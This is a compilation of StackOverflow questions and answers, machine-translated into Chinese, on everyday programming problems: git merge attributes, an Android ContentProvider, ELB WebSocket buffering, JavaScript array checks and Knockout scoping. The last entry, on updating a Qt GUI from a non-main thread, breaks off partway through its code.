# StackOverflow 问答 15232000-15232999

# git - Git - 合并期间忽略文件

> ID：15232000
> 
> 赞同：154
> 
> 时间：2013-03-05T19:04:14.137
> 
> 标签：git, merge, push, ignore, repository

我`myrepo`在远程`beanstalk`服务器上调用了一个 repo。

我将它克隆到我的本地机器上。创建了两个额外的分支：`staging`和`dev`. 也将这些分支推送到远程。

现在：

```
 local                   remote                   server
 --------------------------------------------------------  
 master  ==> Pushes to  `master`  ==> deployed to `prod`
 staging ==> Pushes to  `staging` ==> deployed to `staging`
 dev     ==> Pushes to  `dev`     ==> deployed to `dev` 
```

我有一个名为的文件`config.xml`，每个分支都不同。

我只想在合并期间忽略此文件。但是我希望在我从/向 repo 分支结帐或提交时将其包含在内。

我想要这个的原因是，我们有一个部署脚本，它可以拉出（签出）特定的分支并部署在相应的服务器上。因此，我们需要`config.xml`该特定分支的文件在部署时进入上述特定服务器。

估计`.gitignore`行不通 还有哪些其他选择？请注意，被忽略的文件应该是签出和提交的一部分，这很重要。它应该只在合并期间被忽略。

谢谢！

* * *

## 回答 #1

> 赞同：138
> 
> 时间：2013-05-09T06:34:50.743

我通过使用带有`--no-commit`选项的 git merge 命令解决了这个问题，然后显式删除了暂存文件并忽略了对文件的更改。例如：假设我想忽略任何更改，`myfile.txt`我将按如下方式进行：

```
git merge --no-ff --no-commit <merge-branch>
git reset HEAD myfile.txt
git checkout -- myfile.txt
git commit -m "merged <merge-branch>" 
```

如果您有要跳过的文件列表，您可以将语句 2 和 3 放在 for 循环中。

* * *

## 回答 #2

> 赞同：59
> 
> 时间：2013-03-05T20:29:38.933

我最终找到了 git `attributes`。试一试。工作至今。尚未检查所有场景。但这应该是解决方案。

[合并策略 - Git 属性](https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes#_merge_strategies "合并策略 - Git 属性")

* * *

## 回答 #3

> 赞同：27
> 
> 时间：2018-03-19T08:27:06.730

**`.gitattributes`**- 是存储库的根级文件，它定义了子目录或文件子集的属性。

您可以指定属性来告诉 Git 对特定文件使用不同的合并策略。在这里，我们想`config.xml`为我们的分支保留现有的。我们需要`merge=foo`在文件`config.xml`中设置。`.gitattributes`

`merge=foo`如果发生合并冲突，告诉 git 使用我们的（当前分支）文件。

1.  `.gitattributes`在存储库的根级别添加文件

2.  `.gitattributes`您可以在文件中为 confix.xml 设置一个属性

    ```
     <pattern> merge=foo 
    ```

    让我们举个例子`config.xml`

    ```
     config.xml merge=foo 
    ```

3.  然后定义一个虚拟`foo`合并策略：

    ```
     $ git config --global merge.foo.driver true 
    ```

如果您合并`stag`表单`dev`分支，而不是与`config.xml`文件发生合并冲突，则 stag 分支的 config.xml 会保留您最初拥有的任何版本。

更多参考：[merge_strategies](https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes#_merge_strategies)

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2013-03-05T19:07:24.447

您可以从使用开始`git merge --no-commit`，然后根据您的喜好编辑合并，即通过取消暂存`config.xml`或任何其他文件，然后提交。我怀疑你想在使用钩子之后进一步自动化它，但我认为至少手动完成一次是值得的。

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2018-12-10T08:33:45.743

**例子：**

1.  你有两个分支：`master`,`develop`
2.  您在分支中创建了文件`develop`并希望在合并时忽略它

**代码：**

```
git config --global merge.ours.driver true
git checkout master
echo "path/file_to_ignore merge=ours" >> .gitattributes
git merge develop 
```

您也可以忽略具有相同扩展名的文件

例如所有带有`.txt`扩展名的文件：

```
echo "*.txt merge=ours" >> .gitattributes 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2013-03-05T19:24:49.537

您可以使用`.gitignore`将其保留在`config.xml`存储库之外，然后使用[post commit hook](http://git-scm.com/book/en/Customizing-Git-Git-Hooks)将适当的`config.xml`文件上传到服务器。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2021-03-03T18:50:55.800

正如许多人评论的那样，应该注意的是，[接受的答案](https://stackoverflow.com/a/15233458/2116560)及其副本（对特定文件使用自定义合并策略）**仅在存在实际合并冲突的情况下才有效**。

不会导致合并冲突并因此提交被合并的 2 个简单案例：

*   您`config.xml`在功能分支中有一个文件，而不是在 master 中。您想在合并期间排除它
*   您`config.xml`在两个分支中的文件都基于相同的提交。新代码将添加到功能中的文件中。

* * *

要么按照[unmesh-gurjar](https://stackoverflow.com/a/16455853/2116560)`merge --no-commit`的演示使用，要么简单地将cherry-pick 个人提交提交给 master。后者当然相当麻烦，并带有其他几个陷阱（新的 SHA1 ID 等）

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2015-09-28T17:00:10.880

这里 git-update-index - 将工作树中的文件内容注册到索引。

```
git update-index --assume-unchanged <PATH_OF_THE_FILE> 
```

例子：-

> `git update-index --assume-unchanged somelocation/pom.xml`

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2022-01-20T10:50:47.970

考虑使用 git 钩子：

> 成功运行 git checkout 后，将运行 post-checkout 挂钩；您可以使用它为您的项目环境正确设置工作目录。这可能意味着移动不需要源代码控制的大型二进制文件、自动生成文档或类似的东西。

来源：[https](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks#:%7E:text=After%20you%20run,along%20those%20lines) ://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks#:~:text=After%20you%20run,along%20those%20lines 。

您可以将这些文件放在单独的目录中，如有必要，可以选择通过`.gitignore`.

根据要切换到的分支的名称，来自`post-checkout`钩子的脚本可以获取该分支的正确文件（可能在子目录中）并将它们复制（覆盖）到正确的位置。这些特定于分支的单个文件需要位于`.gitignore`.

`post-checkout`中的脚本示例`.git/hooks`：

```
#!/bin/sh

BRANCH=`git reflog | awk 'NR==1{ print $8; exit }'`

cp "./configs/$BRANCH/config.json" "./config.json"

exit 0 
```

# spring - 如何在 Spring Roo 中搭建所有 finder 方法

> ID：15232001
> 
> 赞同：0
> 
> 时间：2013-03-05T19:04:16.850
> 
> 标签：spring, spring-mvc, spring-roo

我如何查看所有 ActiveRecord 方法列表......我可以通过 make 添加：

查找器列表查找器添加...

然后是这样的：

web mvc 脚手架 --class name --entity MyActiveRecordEntity_which_include_all_posible_methods

当然，我必须在 Web 界面中看到所有这些方法。太好了！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T13:55:18.170

如此简单）））查找程序列表 && 查找程序添加 XXXXXX && web mvc 查找程序添加 --formBackingType ~.domain.XX --class ~.web.XXX_finder

# c++ - 如何在 netbeans c++ 中创建 .tar.gz 源存档

> ID：15232003
> 
> 赞同：1
> 
> 时间：2013-03-05T19:04:22.860
> 
> 标签：c++, netbeans, makefile

我希望能够重新分发我的 netbeans 项目的源代码，最好是在 .tar.gz 源代码存档中。目前，如果我只是从 nbproject 复制源文件、makefile 和相关的 mk 文件，它就不起作用。当我尝试在另一台机器上编译时，make会抱怨它找不到源代码，因为makefile试图编译/home/user/netbeansprojecs/project/sourcefile，而不是与它在同一个文件夹中的源文件.

# javascript - Javascript 和解析的 JSON - 子节点的 ['@attributes'].type 返回未定义

> ID：15232005
> 
> 赞同：0
> 
> 时间：2013-03-05T19:04:25.590
> 
> 标签：javascript, json, multidimensional-array, attributes

我已经解析了一个合法的 JSON 对象，我正在遍历多维数组，首先根据函数参数找到年份，然后是该年内的月份。

我的 for 循环是嵌套的：

```
 for (year in yearsData) {
        //If we've found the correct year...
        if (yearsData[year]['@attributes'].name == yearToGet) {

        //...walk through that year's child months
        for (month in yearsData[year]) {

            //This works!
            console.log(yearsData[year][month]);

            //This also works!
            console.log(yearsData[year][month]['@attributes']);

            //This does not work! ..but this is what I need!
            console.log(yearsData[year][month]['@attributes'].name);
        }       
   } 
```

* * *

我可以一直跟踪 Firebug 控制台中的对象（具有有效输出）

> console.log(yearsData[year][month]['@attributes']);

但是我在末尾添加类型的那一刻（.name）：

> yearsData[year][month]['@attributes'] 未定义。

console.log(yearsData[year][month]); 返回有效对象，我可以*看到*列出的有效@attributes。

我已经多次检查拼写；我已将属性的名称更改为其他名称，以防它与年份的属性发生某种冲突……但我什么也没得到。

我错过了什么简单的事情？

JSON：

```
{
"year": [
    {
        "@attributes": {
            "name": "2013"
        },
        "month": {
            "@attributes": {
                "name": "January"
            },
            "winner": "None!",
            "theme": "Nobody!"
        }
    }
] 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T21:29:36.530

经过一番脑筋急转弯，结果证明它是一个超级笨蛋。我使用的是变量月份，而不是可以识别它的字符串“月份”。

我需要使用：console.log(yearsData[year]['month']['@attributes'].name);

为拿到它，为实现它。哇。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:22:03.997

考虑使用 jQuery.grep 或 jQuery.each 高效地进行对象迭代和分析。它可以帮助很多。

[http://api.jquery.com/jQuery.grep/](http://api.jquery.com/jQuery.grep/)

# xml - XSD：minOccurs="0" 和 defaultValue="x" 的意义是什么

> ID：15232006
> 
> 赞同：2
> 
> 时间：2013-03-05T19:04:25.603
> 
> 标签：xml, xsd, default, optional

我发现自己想知道 XSD 中 defaultValue 属性的用途是什么。例如，考虑一个 complexType

```
 <xs:complexType name="myType">
    <xs:sequence>
        <xs:element name="test1" type="type1" defaultValue="x" minOccurs="0" maxOccurs="1"/>
        <xs:element name="test2" type="type2"/>
    </xs:sequence>
 </xs:complexType> 
```

我将能够验证表单的 XML 文件

```
<myType>
  <test2>dsjhfdshflk</test2>
</myType> 
```

现在的 defaultValue 属性有什么意义`<test1>`？

非常感谢提前

米沙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:34:34.503

在您的架构片段中声明的默认值`test1`具有导致架构处理器将`<test1/>`其视为有效同义词的效果`<test1>x</test1>`。它不会导致模式处理器将您的示例实例视为同义词

```
<myType>
  <test1>x</test1>
  <test2>dsjhfdshflk</test2>
</myType> 
```

这让一些希望在元素根本不出现时提供默认值的用户感到失望。

原因是一般来说，元素不限于最多出现一次，或者最多出现在子元素中的单个位置。如果您的类型定义中的 xs:sequence 被替换为带有 maxOccurs='unbounded' 的 xs:choice，那么这种语言建议在`<test1>x</test1>`任何可能出现 test1 的地方提供但没有提供的语言将被迫提供无限数量的此类默认 test1 元素. 对于设计 XSD 的工作组的成员来说，这似乎不是一个好主意。

那么为什么会有默认值呢？有时它们很方便，并且允许元素的默认值可以在子元素和属性的处理之间提供更大的并行性，这是负责工作组中某些人的明确目标。

# model-view-controller - 为什么在服务器上使用 MVC？这不是客户端模式吗？

> ID：15232010
> 
> 赞同：4
> 
> 时间：2013-03-05T19:04:32.157
> 
> 标签：model-view-controller, angularjs

我正在尝试学习网络开发。

我（主要）理解 MVC 的概念，但我对为什么在服务器端使用 MVC 模型......就像 Spring MVC 感到困惑。服务器端不是模型和服务，然后是客户端服务、视图和控制器（AngularJS 甚至在客户端明确表示该模式）？

我真的在为 MVC 模型如何适应或促进服务器端开发而苦苦挣扎。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T19:16:06.953

MVC 是一种不仅仅是 Web 应用程序使用的模式。任何带有 UI 的应用程序都可以使用 MVC 模式。

这个想法是你有一个视图（html，或者你的操作系统中的一个窗口，甚至是一个报告或其他东西），你有一个代表该视图的动态部分的模型。然后你有一个控制器专门用于处理输入并执行“业务逻辑”来生成模型并将其应用于视图。

所以..例如在服务器上你可能有这个 MVC 模式：

*   控制器接收 HTTP 请求并对其进行处理。
*   它建立一个模型
*   该模型应用于视图以生成 HTML 并将其作为响应发送回。

在客户端它会是类似的（但在 Angular 的情况下有点不同）：

*   控制器用于确定和操纵模型。
*   然后模型通过指令绑定到您的视图。（Angular 更像是一种 MVVM 模式，但也足够相似）
*   视图同样通过指令绑定到您的模型。（这就是 MVVM 部分的用武之地）。
*   这里的想法是模型和视图都通过指令保持最新。
*   控制器只包含用于操作模型的“业务逻辑”。

**清如泥？**

不用担心。只要知道这一点：*这只是一种常见的模式*。它不是“特定于服务器”或“特定于客户端”。它可以在任何需要将数据清理到模板输出中的任何地方使用。

* * *

**编辑：更多的想法。**

对于在服务器上提供 JSON（甚至 XML）的 Web API，在大多数情况下，您仍在使用 MVC。这是因为你正在做的是：

*   在控制器中处理请求。
*   在控制器中建立模型。
*   将模型渲染到“视图”，在这种情况下，它是一个将其序列化为 JSON 的视图。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-05T19:22:34.010

在过去的好日子里，客户端只是一个显示器。服务器负责与模型通信、应用业务逻辑、生成视图以及将静态渲染内容发送回客户端（浏览器）。

随着网络的成熟，其中一些职责从服务器转移到了客户端。现在，服务器端通常是像 RESTful API 这样的薄层，存储“官方”业务逻辑（而不是客户端上的便利逻辑）并存储模型。但是为了性能和用户体验，客户端现在将模型的副本存储在自己的模型层中，根据需要与服务器和/或本地存储进行通信，并拥有自己的控制器和视图逻辑以提供出色的用户体验。

那么 MVC 是否仍然适用于服务器？是的！只是不一样。服务器通常会生成客户端应用程序运行的初始视图（例如考虑本地化或国际化），并且仍然包含官方模型。但更重要的是，MVC 中的“视图”刚刚发生了变化。服务器端视图不再是 HTML，而是客户端应用程序使用的 JSON 或 XML，*而*不仅仅是*呈现*。

所以为了功能的缘故，我们仍然在服务器上使用 MVC。但是为了获得出色的用户体验，我们现在也在客户端使用 MVC。

# android - Sqlite_Content Provider 助手

> ID：15232014
> 
> 赞同：0
> 
> 时间：2013-03-05T19:04:43.160
> 
> 标签：android, sqlite, android-contentprovider, android-cursorloader

我正在尝试使用 Content Provider 让我的 ListView 刷新。我已经创建了我的 Provider 并尝试将它链接到我的 SqlLite DB。一旦我完成了我的提供者，我将实施我的光标加载器，但首先我需要我的提供者的帮助。我还没有为新手用户找到有关如何创建内容提供者的详细信息。任何援助将不胜感激。我的数据库和提供者发布在下​​面。我的主要问题是尝试创建一个链接到我的数据库的 URI。

D B：

```
 public class dataStore extends SQLiteOpenHelper {

//Table attributes
public static final String DATABASE_NAME = "SiteLogindb";
public static final int DATABASE_VERSION = 2;
public static final String TABLE_NAME_INFOTABLE = "infoTable";

// Data attributes
public static final String COLUMN_NAME_SITE = "sName";
public static final String COLUMN_NAME_ADDRESS = "wUrl";
public static final String COLUMN_NAME_USERNAME = "uName";
public static final String COLUMN_NAME_PASSWORD = "pWord";
public static final String COLUMN_NAME_NOTES = "lNotes";

public dataStore(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
        // TODO Auto-generated constructor stub
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        // TODO Auto-generated method stub

        String sqlDataStore = "create table if not exists " +
        TABLE_NAME_INFOTABLE + " ("+ BaseColumns._ID + " integer primary key autoincrement,"

                    + COLUMN_NAME_SITE + " text not null,"
                    + COLUMN_NAME_ADDRESS + " text not null,"
                    + COLUMN_NAME_USERNAME + " text not null,"
                    + COLUMN_NAME_PASSWORD + " text not null,"
                    + COLUMN_NAME_NOTES + " text not null);";

        db.execSQL(sqlDataStore);
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // TODO Auto-generated method stub
        if(oldVersion == 1 && newVersion == 2){
            //Upgrade the database

     }

        }
          } 
```

内容提供商：

```
 public class ListProvider extends ContentProvider {
private dataStore lDB;

private static final String AUTHORITY = "com.loginplus.home.ListProvider";
public static final int TUTORIALS = 1;
public static final int TUTORIAL_ID = 2;
private static final String TUTORIALS_BASE_PATH = "tutorials";
public static final Uri CONTENT_URI = Uri.parse("content://" + AUTHORITY
        + "/" + TUTORIALS_BASE_PATH);
public static final String CONTENT_ITEM_TYPE = ContentResolver.CURSOR_ITEM_BASE_TYPE
        + "/mt-tutorial";
public static final String CONTENT_TYPE = ContentResolver.CURSOR_DIR_BASE_TYPE
        + "/mt-tutorial";

@Override
public boolean onCreate() {
    lDB = new dataStore(getContext());
    return true;
}

private static final UriMatcher sURIMatcher = new UriMatcher(
        UriMatcher.NO_MATCH);
static {
    sURIMatcher.addURI(AUTHORITY, TUTORIALS_BASE_PATH, TUTORIALS);
    sURIMatcher.addURI(AUTHORITY, TUTORIALS_BASE_PATH + "/#", TUTORIAL_ID);
}

@Override
public Cursor query(Uri uri, String[] projection, String selection,
        String[] selectionArgs, String sortOrder) {
    SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();
    queryBuilder.setTables(dataStore.TABLE_NAME_INFOTABLE);
    int uriType = sURIMatcher.match(uri);
    switch (uriType) {
    case TUTORIAL_ID:
        queryBuilder.appendWhere(dataStore.DATABASE_VERSION + "="
                + uri.getLastPathSegment());
        break;
    case TUTORIALS:
        // no filter
        break;
    default:
        throw new IllegalArgumentException("Unknown URI");
    }
    Cursor cursor = queryBuilder.query(lDB.getReadableDatabase(),
            projection, selection, selectionArgs, null, null, sortOrder);
    cursor.setNotificationUri(getContext().getContentResolver(), uri);
    return cursor;
}
//Deleting DB entries
@Override
public int delete(Uri uri, String selection, String[] selectionArgs) {
    int uriType = sURIMatcher.match(uri);
    SQLiteDatabase sqlDB = lDB.getWritableDatabase();
    int rowsAffected = 0;
    switch (uriType) {
    case TUTORIALS:
        rowsAffected = sqlDB.delete(dataStore.TABLE_NAME_INFOTABLE,
                selection, selectionArgs);
        break;
    case TUTORIAL_ID:
        String id = uri.getLastPathSegment();
        if (TextUtils.isEmpty(selection)) {
            rowsAffected = sqlDB.delete(dataStore.TABLE_NAME_INFOTABLE,
                    BaseColums.ID + "=" + id, null);
        } else {
            rowsAffected = sqlDB.delete(dataStore.TABLE_NAME_INFOTABLE,
                    selection + " and " + BaseColums.ID + "=" + id,
                    selectionArgs);
        }
        break;
    default:
        throw new IllegalArgumentException("Unknown or Invalid URI " + uri);
    }
    getContext().getContentResolver().notifyChange(uri, null);
    return rowsAffected;
}
@Override
public String getType(Uri uri) {
    // TODO Auto-generated method stub
    return null;
}
//Inserting DB entries
@Override
public Uri insert(Uri uri, ContentValues values) {
    // TODO Auto-generated method stub
            return null;
}
//updating DB entries
@Override
public int update(Uri uri, ContentValues values, String selection,
        String[] selectionArgs) {
    int uriType = sURIMatcher.match(uri);
    SQLiteDatabase sqlDB = lDB.getWritableDatabase();
    int rowsAffected = 0;
    switch (uriType) {
    case TUTORIALS:
        rowsAffected = sqlDB.update(dataStore.TABLE_NAME_INFOTABLE,
                null, selection, selectionArgs);
        break;
    case TUTORIAL_ID:
        String id = uri.getLastPathSegment();
        if (TextUtils.isEmpty(selection)) {
            rowsAffected = sqlDB.update(dataStore.TABLE_NAME_INFOTABLE,
                    null, BaseColums.ID + "=" + id, null);
        } else {
            rowsAffected = sqlDB.update(dataStore.TABLE_NAME_INFOTABLE,
                    null, selection + " and " + BaseColums.ID + "=" + id,
                    selectionArgs);
        }
        break;
    default:
        throw new IllegalArgumentException("Unknown or Invalid URI " + uri);
    }
    getContext().getContentResolver().notifyChange(uri, null);
    return rowsAffected;
}
  } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:39:54.167

> 我的主要问题是尝试创建一个链接到我的数据库的 URI。

*   现在，您`ListProvider.CONTENT_URI`将匹配您`ListProvider`使用的`UriMatcher`. 您`ListProvider`正在使用您`dataStore.TABLE_NAME_INFOTABLE`的数据库中唯一的表。

*   因此，您已经可以通过在您的代码中`ContentProvider`使用 a 来直接使用`ContentResolver`您`Activity`的代码，如下所示：

    ```
     getContentResolver().query(ListProvider.CONTENT_URI, projection, selection, selectionArgs, sortOrder);
     getContentResolver().delete(ListProvider.CONTENT_URI, where, selectionArgs);
     //etc... 
    ```

* * *

> 一旦我完成了我的提供者，我将实施我的光标加载器，但首先我需要我的提供者的帮助。

*   你的`ContentProvider`似乎完成了。但是，您必须记住使用相同的`AUTHORITY`. 您可以重命名权限，但它必须是唯一的，并且在您的 ContentProvider 和您的清单中匹配。

    ```
    <provider
        android:name="com.loginplus.home.ListProvider"
        android:authorities="com.loginplus.home.ListProvider" >
    </provider> 
    ```

*   然后，您将能够`CursorLoader`在`public Loader<Cursor> onCreateLoader(int id, Bundle args)`回调中创建您的。

    ```
    CursorLoader cursorLoader = new CursorLoader(this, ListProvider.CONTENT_URI, projection, selection, selectionArgs, orderBy); 
    ```

* * *

> 我还没有为新手用户找到有关如何创建内容提供者的详细信息。任何援助将不胜感激。

*   Lars Vogella 有一个很棒的[教程](http://www.vogella.com/articles/AndroidSQLite/article.html)，可以引导您创建自己的`SQLite database`、`ContentProvider`. 和`CursorLoader`. 这帮助我开始并给了我很好的基础。

# ssl - 亚马逊 ELB 上基于 SSL 的 Websocket 延迟问题

> ID：15232016
> 
> 赞同：2
> 
> 时间：2013-03-05T19:04:46.370
> 
> 标签：ssl, amazon-ec2, websocket, amazon-elb

我按照此链接中的说明进行操作： [如何使 Amazon 的 ELB 与 HTTPS/SSL 一起使用 Web 套接字？](https://stackoverflow.com/questions/9184895/how-do-you-get-amazons-elb-with-https-ssl-to-work-with-web-sockets)设置 ELB 以使用 Websocket（在 TCP 模式下将 ELB 转发 443 到 8443）。现在我看到 wss 的这个问题：服务器发送 message1，客户端没有收到它；几秒钟后，服务器发送消息 2，客户端收到两条消息（两条消息大约 30 个字节）。我可以很容易地重现这个问题。如果我在服务器上使用 iptable 设置端口转发并让客户端直接连接到服务器（端口 443），我就没有问题 此外，这个问题似乎只发生在 wss 上。ws 工作正常。

服务器正在运行 jetty8。

我检查了 EC2 论坛并没有真正找到任何东西。我想知道是否有人见过同样的问题。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T13:54:22.167

根据您的描述，这很可能是 ELB 的缓冲问题。快速研究表明这实际上是问题所在。

来自[ELB 文档](http://docs.aws.amazon.com/ElasticLoadBalancing/latest/DeveloperGuide/elb-listener-config.html)：

> 当您对前端和后端连接都使用 TCP 时，您的负载均衡器会将请求转发到后端实例，而不修改标头。此配置也不会为会话粘性或 X-Forwarded-* 标头插入 cookie。
> 
> 当您对前端和后端连接都使用 HTTP（第 7 层）时，负载均衡器会解析请求中的标头并终止连接，然后再将请求重新发送到已注册的实例。这是 Elastic Load Balancing 提供的默认配置。

来自[AWS 论坛](https://forums.aws.amazon.com/thread.jspa?messageID=315499&#315499)：

> 我相信这是 HTTP/HTTPS 特定的，但不可配置，但不能说我确定。您可能想尝试在端口 80 上以纯 TCP 模式使用 ELB，我相信这只会将流量传递给客户端，反之亦然，无需缓冲。

您能否尝试进行更多测量并查看此延迟如何取决于消息大小？

现在，我不完全确定你已经做了什么，什么失败了，什么没有失败。然而，从文档和论坛帖子来看，该解决方案似乎对**前端和后端都使用 TCP/SSL（第 4 层）ELB 类型。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-02-04T00:58:19.903

这与“Nagle 算法”产生了共鸣...... TCP 堆栈可以配置为在通过网络发送请求之前捆绑请求以减少流量。这可以解释症状，但值得一试

# javascript - 如何检查数组是否包含元素

> ID：15232017
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:04:46.787
> 
> 标签：javascript, jquery

我想限制可以按下的键。

```
$('.txtComments').keydown(function (event) {
  var keys = new Array();
  keys[0] = "8";
  keys[1] = "46";
  keys[2] = "37"
  keys[3] = "39"

  if(!(....)) //Check whether the keyCode is either of 8, 46, 37, or 39\. 
  {
     event.preventDefault();  
  }
}); 
```

感谢您的帮助

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:07:00.863

这里最简单（也是最快）的方法是将对象用作 map ：

```
 var keys = {};
   keys[8] = true;
   ...

   if (!keys[event.which]) {
     ... 
```

请注意，我建议使用[event.which](http://api.jquery.com/event.which/)而不是 keycode 以获得更好的兼容性。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T19:08:24.950

有*很多*方法可以实现这一点：

只需硬编码：

```
var keyCode = event.which;

if (keyCode != 8 && keyCode != 46 ...) 
```

或检查一个数组：

```
var keys = [8, 46, ...];
if (keys.indexOf(keyCode) < 0) 
```

或等效的 jQuery：

```
if ($.inArray(keyCode, keys) < 0) 
```

或检查一个对象：

```
var keys = { 8: 1, 46: 1, ... }
if (! (keyCode in keys) )  // or if (!keys[keyCode]) 
```

或开关：

```
switch (keyCode) {
    case 8: case 46: ...
        // do nothing
        break;
    default:
        event.preventDefault();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T19:07:48.080

jQuery 提供了实用方法[`jQuery.inArray()`](http://api.jquery.com/jQuery.inArray/)来检查数组是否包含值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T19:07:43.603

`if(!keys.in_array(event.keyCode));`

并将您的更改`keydown`为`keypress`

```
<script type="text/javascript">
// Benoit Asselin - http://www.ab-d.fr
Array.prototype.in_array = function(p_val) {
    for(var i = 0, l = this.length; i < l; i++) {
        if(this[i] == p_val) {
            return true;
        }
    }
    return false;
}
</script> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-05T19:17:11.617

您可以使用：-

```
 var keys = [];
    keys[8] = keys[4] = keys[37] = keys[39] = true;

if(keys[keyval]){

} 
```

# python - 提升 Python 幻数

> ID：15232019
> 
> 赞同：1
> 
> 时间：2013-03-05T19:04:49.707
> 
> 标签：python, boost, magic-numbers

我正在尝试包装一些 C++ 函数以在 python 中使用。例如，这里是 boost Python 教程中的函数。

```
//  Copyright Joel de Guzman 2002-2004\. Distributed under the Boost
//  Software License, Version 1.0\. (See accompanying file LICENSE_1_0.txt
//  or copy at http://www.boost.org/LICENSE_1_0.txt)
//  Hello World Example from the tutorial
//  [Joel de Guzman 10/9/2002]

#include <boost/python/module.hpp>
#include <boost/python/def.hpp>

char const* greet()
{
   return "hello, world";
}

BOOST_PYTHON_MODULE(hello_ext)
{
    using namespace boost::python;
    def("greet", greet);
} 
```

当我将其编译成 .pyc 文件并尝试将其导入 python 时，我收到错误：

> ImportError：C:\hello_ext.pyc 中的错误幻数

我已经使用另一个论坛的方法检查了幻数，它似乎确实是错误的。我四处搜索，但找不到有关此错误消息的任何有用信息。我怀疑这是我的 Visual Studio 项目文件中的错误设置，或者可能与我编译 boost 的方式有关？

我正在使用 Visual Studio 2010 服务包 1、python 2.7.3 和 boost 1.53

我使用以下选项编译了 boost。

```
b2 install toolset=msvc-10.0 variant=debug,release threading=multi link=shared runtime-link=shared --prefix="C:\boost" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:27:02.903

当你编译 boost python 时，你应该得到一个共享库（例如我的机器上的 *.so），而不是 .pyc 文件。

这是一个关于如何构建 boost python 扩展的页面： [http ://wiki.python.org/moin/boost.python/BuildingExtensions](http://wiki.python.org/moin/boost.python/BuildingExtensions)

# knockout.js - 如何在嵌套的可观察数组中调用剔除函数

> ID：15232021
> 
> 赞同：0
> 
> 时间：2013-03-05T19:04:51.857
> 
> 标签：knockout.js

我有一个品牌列表，品牌包含汽车列表。[在http://jsfiddle.net/PZqEk/1/](http://jsfiddle.net/PZqEk/1/)的淘汰赛中声明了简单的视图模型。单击删除按钮时，在 removeCar 函数中未定义 this.cars。如何使用最佳实践删除点击的汽车？

html:

```
<h1 data-bind="text:title"></h1>
<table>
    <tbody data-bind="foreach: brands">
        <tr>
            <td>
                <span data-bind="text: nameOfBrand"></span>
                <ul data-bind="foreach: cars">
                    <li>
                        <span data-bind="text: nameOfCar"></span>
                        (<span data-bind="text: yearOfCar"></span>)
                        <input data-bind="click: $root.removeCar" type="button" value="remove"/>
                    </li>
                </ul>
            </td>
        </tr>
    </tbody>
</table> 
```

Javascript：

```
function RootModel()
{
    this.title = ko.observable("Dummy Title");
    this.brands = ko.observableArray();

    var b1 = new brandModel("Audi");
    b1.cars.push(new carModel("A3", 2005));
    b1.cars.push(new carModel("A6", 2005));

    var b2 = new brandModel("Volkswagen");
    b2.cars.push(new carModel("Golf", 2010));
    b2.cars.push(new carModel("Passat", 2008));
    b2.cars.push(new carModel("Polo", 2012));

    this.brands.push(b1);
    this.brands.push(b2);
}

function brandModel(name)
{
    this.nameOfBrand = ko.observable(name);
    this.cars = ko.observableArray();

    this.removeCar = function(car){
        this.cars.remove(car); // this.cars = undefined;
    }
}

function carModel(name, year){
    this.nameOfCar = ko.observable(name);
    this.yearOfCar = ko.observable(year);
}

ko.applyBindings(new RootModel()); 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:09:50.447

问题是您正在`this`从未在实例上调用的函数访问。你需要一个别名。

```
function brandModel(name) {
    var self = this; // alias
    self.nameOfBrand = ko.observable(name);
    self.cars = ko.observableArray();

    self.removeCar = function(car) {
        self.cars.remove(car); // access through the alias instead
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:18:12.190

Jeff 是正确的，因为您应该使用别名`this`（通常通过`self = this;`在模型顶部声明），我建议对您制作的每个 Knockout 应用程序都这样做。

但是，我一开始并没有注意到你在使用`this`，并立即尝试了这段代码：

```
<input data-bind="click: function(data, event) { $parent.removeCar(data); }" type="button" value="remove"/> 
```

作为你小提琴的唯一改变，它奏效了。

# c++ - 如何强制 Qt 从非主线程更新 GUI

> ID：15232023
> 
> 赞同：0
> 
> 时间：2013-03-05T19:04:55.340
> 
> 标签：c++, qt, qt4

自上周以来，我一直在与 QPlainTextEdit 更新引起的问题作斗争。我正在尝试使用 QPlainTextEdit 创建与 QMainWindow Dialog 窗口分开的窗口。当我尝试使用 appendHtml 信号（也尝试使用 appendText）时，问题就开始了，除非用鼠标标记，否则放置的文本是不可见的。重绘或更新导致程序崩溃或没有可见操作。

带有 QPlainTextEdit 标头的 QDialog 的简化代码：

```
namespace Ui {
class LogWindow;
}

class LogWriter: public QDialog
{   
Q_OBJECT

QMutex print_lock;

public:

class Log{

    Q_OBJECT

    const static int MAX_SIZE = 100;
    bool to_terminal;
    QString color;
    QMutex *print_lock;
    QPlainTextEdit *text_place;
    QVector< QPair<QString,time_t> > history;
